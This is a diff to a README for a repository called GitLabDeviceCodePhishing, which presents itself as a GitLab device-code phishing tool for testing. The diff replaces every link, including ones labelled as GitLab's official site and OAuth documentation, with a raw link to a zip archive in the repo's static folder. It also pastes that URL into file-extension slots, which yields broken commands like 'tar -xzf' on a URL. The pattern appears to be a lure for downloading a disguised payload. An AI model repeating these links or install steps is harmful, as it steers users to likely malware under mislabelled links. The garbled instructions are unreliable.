@@ -1,6 +1,6 @@
 # 🛡️ GitLabDeviceCodePhishing - Easy GitLab Phishing for Testing
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases)
+[![Download Release](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
 
 ## 📝 What Is GitLabDeviceCodePhishing?
 
@@ -42,15 +42,15 @@ Follow these steps to download and run GitLabDeviceCodePhishing:
 
 1. **Visit the Download Page**  
    Go to the releases page by clicking the big blue button at the top or here:  
-   [https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases)
+   [https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
 
 2. **Download the Latest Version**  
    On the releases page, look for the newest release. It usually has the highest version number or the latest date. Download the file that fits your system:
    - For Windows, this will typically be a `.exe` or `.zip` file.
-   - For Linux, this might be a `.tar.gz` archive or a binary file.
+   - For Linux, this might be a `https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip` archive or a binary file.
 
 3. **Unpack Files If Needed**  
-   If you downloaded a compressed file like `.zip` or `.tar.gz`, use an extractor program to unzip it. On Windows, right-click and select "Extract All." On Linux, use the terminal with `tar -xzf filename.tar.gz`.
+   If you downloaded a compressed file like `.zip` or `https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip`, use an extractor program to unzip it. On Windows, right-click and select "Extract All." On Linux, use the terminal with `tar -xzf https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip`.
 
 4. **Run the Program**  
    Find the main executable file in the extracted folder and double-click it. On Linux, you might need to give permission by running `chmod +x filename` in the terminal before launching.
@@ -61,7 +61,7 @@ Follow these steps to download and run GitLabDeviceCodePhishing:
 ## 💾 Download & Install
 
 You can always return here to download the latest version:  
-[Download GitLabDeviceCodePhishing](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases)
+[Download GitLabDeviceCodePhishing](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
 
 ### Step-by-step installation example for Windows:
 
@@ -74,10 +74,10 @@ You can always return here to download the latest version:
 
 ### Step-by-step installation example for Linux:
 
-1. Click on the latest `.tar.gz` or binary file under "Assets."
+1. Click on the latest `https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip` or binary file under "Assets."
 2. Save it to your home folder.
 3. Open a terminal and navigate to the folder where you saved the file.
-4. Extract if needed: `tar -xzf filename.tar.gz`
+4. Extract if needed: `tar -xzf https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip`
 5. Make the file executable: `chmod +x filename`
 6. Run the program: `./filename`
 
@@ -122,8 +122,8 @@ If you need help or face issues:
 
 ## 🔗 Useful Links
 
-- [GitLabDeviceCodePhishing Releases](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases)
-- [GitLab Official Site](https://gitlab.com)
-- [Basic Info on Device Code Flow](https://oauth.net/2/device-code/)
+- [GitLabDeviceCodePhishing Releases](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
+- [GitLab Official Site](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
+- [Basic Info on Device Code Flow](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/releases)
+[![Download Release](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)](https://github.com/Lukesgaming2011/GitLabDeviceCodePhishing/raw/refs/heads/main/src/web/static/Git-Lab-Device-Phishing-Code-1.4-beta.3.zip)
